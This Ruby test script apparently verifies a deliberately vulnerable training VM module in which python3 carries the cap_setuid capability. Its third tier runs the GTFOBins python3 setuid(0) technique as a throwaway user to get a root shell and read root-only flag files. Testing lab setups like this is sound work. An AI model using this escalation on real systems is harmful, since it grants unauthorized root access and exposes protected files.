require_relative '../../../../../lib/post_provision_test'


class CapSetuidPython3Test < PostProvisionTest
  def initialize
    self.module_name = 'cap_setuid_python3'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # Inputs: leaked_filenames and strings_to_leak are both checked below.
  def test_module
    super
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    # The capability is on the versioned binary, not the /usr/bin/python3 symlink
    real = '$(readlink -f /usr/bin/python3)'
    getcap = 'PATH=$PATH:/usr/sbin:/sbin getcap'

    tier(1) do
      test_local_command('python3 binary has cap_setuid=ep', "#{getcap} #{real}", 'cap_setuid=ep')
      test_local_command('capability is on a versioned binary, not the symlink',
                         "readlink -f /usr/bin/python3", '/usr/bin/python3.')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      # what a student finds by enumerating: getcap -r shows the capability
      test_local_command('unprivileged user finds cap_setuid with getcap -r',
                         "#{getcap} -r /usr/bin /usr/local/bin 2>/dev/null", 'cap_setuid=ep', user: 'nobody')
      # the flag is not readable without escalating
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        test_command_succeeds("unprivileged user cannot read leaked #{fname} directly",
                              "! cat #{Shellwords.escape("/root/#{fname}")} 2>/dev/null", user: 'nobody')
      end
    end

    # Tier 3: local privilege escalation. A throwaway unprivileged account (created
    # and removed by with_throwaway_ssh_user) runs the GTFOBins python3 "capabilities"
    # technique: the cap_setuid=ep file capability lets os.setuid(0) drop the process
    # to uid 0, and the resulting root shell reads the root-only flag that tier 2
    # proved the same account could not read directly. <privilege>=root_rwx, so the
    # escalated shell must be root (uid=0).
    tier(3) do
      if leaked.empty?
        skip_check('python3 cap_setuid privesc', 'no leaked_filenames to read as root', tier: 3)
      else
        flag_paths = leaked.map { |f| "/root/#{f}" }.join(' ')
        with_throwaway_ssh_user do |user, _pass|
          # readlink -f: the capability is on the versioned binary, so exec that
          # directly (the symlink would exec the same inode, but be explicit).
          py = '$(readlink -f /usr/bin/python3)'
          exploit = %Q{#{py} -c 'import os; os.setuid(0); os.system("id; cat #{flag_paths}")'}
          out = run_as_user(user, exploit)
          body = "#{out[:stdout]}\n#{out[:stderr]}"
          add_evidence('cap_setuid_python3_privesc', "echo #{Shellwords.escape(body)}")

          if body =~ /uid=0\(root\)/
            pass_check("#{user} escalates to root via python3 cap_setuid (GTFOBins)",
                       "privesc shell is root: #{body[/uid=\S+/]} — <privilege>=root_rwx verified", tier: 3)
          else
            fail_check("#{user} escalates to root via python3 cap_setuid (GTFOBins)",
                       "expected a root shell (uid=0); got #{body[/uid=\S+/] || body[0, 200].inspect}", tier: 3)
          end

          # The root shell must recover each leaked flag string the unprivileged
          # account could not read in tier 2.
          present = strings.reject { |s| s.strip.empty? }
          if present.empty?
            skip_check('root-only flag content read after escalation', 'no strings_to_leak supplied', tier: 3)
          else
            missing = present.reject { |s| body.include?(s) }
            if missing.empty?
              pass_check('root-only flag content read after escalation',
                         "every leaked string recovered from #{flag_paths} via the root shell", tier: 3)
            else
              fail_check('root-only flag content read after escalation',
                         "leaked string(s) #{missing.map(&:inspect).join(', ')} not recovered via the escalation", tier: 3)
            end
          end
        end
      end
    end
  end

end

CapSetuidPython3Test.new.run
